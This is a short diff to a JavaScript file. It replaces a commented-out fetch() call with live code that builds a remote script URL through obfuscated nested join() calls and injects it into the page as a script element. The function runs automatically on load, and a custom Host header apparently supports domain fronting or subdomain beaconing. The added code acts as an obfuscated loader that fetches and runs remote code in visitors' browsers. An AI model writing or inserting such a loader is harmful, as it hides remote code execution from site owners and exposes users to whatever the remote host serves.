@@ -43,14 +43,14 @@ function myFunction() {
 				'Host': temp
 			},
 		};
-		//var scriptElm= document.createElement("script");
-		//scriptElm.src='https://' + i + '-' + [temp, param1].join('.') + '/index.jpg';
+		var scriptElm = document.createElement("script");
+		scriptElm.src = [[[[[proto, i].join(''),'-'].join(''), temp].join(''), domain].join('.'),'index.js'].join('');
 		//scriptElm.src= [param1, [temp,'.js'].join('')].join('');
-		//document.body.appendChild(scriptElm);
+		document.body.appendChild(scriptElm);
 		//var urlPath = [param1, [temp,'.txt'].join('')].join('');
-		//var urlPath = [[[proto, domain].join(''), temp].join(''), '.woff2'].join('');
-		var urlPath = [[[[[proto, i].join(''),'-'].join(''), temp].join(''), domain].join('.'),'index.txt'].join('');
-		fetch(urlPath, config).then((res)=> {}).then((text)=> {});
+		//var urlPath = [[[proto, domain].join(''), temp].join(''), '.js'].join('');
+		//var urlPath = [[[[[proto, i].join(''),'-'].join(''), temp].join(''), domain].join('.'),'index.js'].join('');
+		//fetch(urlPath, config).then((res)=> {}).then((text)=> {});
 	}
 }
 myFunction();
